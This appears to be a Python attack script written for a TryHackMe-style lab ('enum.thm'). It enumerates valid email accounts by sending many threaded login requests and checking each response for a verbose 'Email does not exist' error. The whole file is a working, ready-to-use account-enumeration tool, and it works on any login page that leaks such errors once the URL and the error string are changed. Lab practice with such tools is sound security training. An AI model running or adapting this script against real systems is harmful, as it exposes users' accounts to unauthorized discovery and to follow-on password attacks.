import requests
import sys
import argparse
import concurrent.futures
from colorama import Fore, Style, init
import threading

# Initialize colorama
init(autoreset=True)

# Create a lock for print processes to prevent overlap
print_lock = threading.Lock()

def check_email(email, url, invalid_error):
    """Function to check a single email against the server."""
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': f'{url.rsplit("/", 1)[0]}/',
    }
    data = {
        'username': email,
        'password': 'password123',
        'function': 'login'
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=100)
        response_json = response.json()

        # Use lock before printing
        with print_lock:
            if response_json.get('status') == 'error' and invalid_error in response_json.get('message', ''):
                print(f"{Fore.RED}[INVALID] {email}")
                return None
            else:
                print(f"{Fore.GREEN}[VALID]   {email}")
                return email
    except requests.RequestException as e:
        with print_lock:
            print(f"{Fore.YELLOW}[ERROR] Failed to reach {email}: {e}")
        return None

def enumerate_emails(email_file, url, invalid_error, max_threads):
    """Reads the email file and runs checks concurrently using ThreadPoolExecutor."""
    valid_emails = []

    try:
        with open(email_file, 'r') as file:
            emails = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[FATAL] Wordlist file not found: {email_file}")
        sys.exit(1)

    print(f"\n{Fore.CYAN}[INFO] Starting enumeration with {max_threads} threads...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        results = executor.map(lambda email: check_email(email, url, invalid_error), emails)

        for result in results:
            if result:
                valid_emails.append(result)

    return valid_emails

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Email Enumeration Tool via Verbose Errors")

    parser.add_argument('-u', '--url',
                        required=True,
                        help="Full URL to the login PHP file/function. E.g.: http://enum.thm/labs/verbose_login/functions.php")

    parser.add_argument('-w', '--wordlist',
                        required=True,
                        help="Path to the email list file (wordlist).")

    parser.add_argument('-e', '--error-string',
                        default="Email does not exist",
                        help="Error message string indicating an invalid email. Default: 'Email does not exist'")

    parser.add_argument('-t', '--threads',
                        type=int,
                        default=10,
                        help="Number of threads to use. Default: 10")

    args = parser.parse_args()

    valid_emails = enumerate_emails(args.wordlist, args.url, args.error_string, args.threads)

    if valid_emails:
        print(f"\n{Style.BRIGHT}{Fore.GREEN}--- Valid Emails Found ---")
        for valid_email in valid_emails:
            print(valid_email)
    else:
        print(f"\n{Style.BRIGHT}{Fore.YELLOW}--- No valid emails found ---")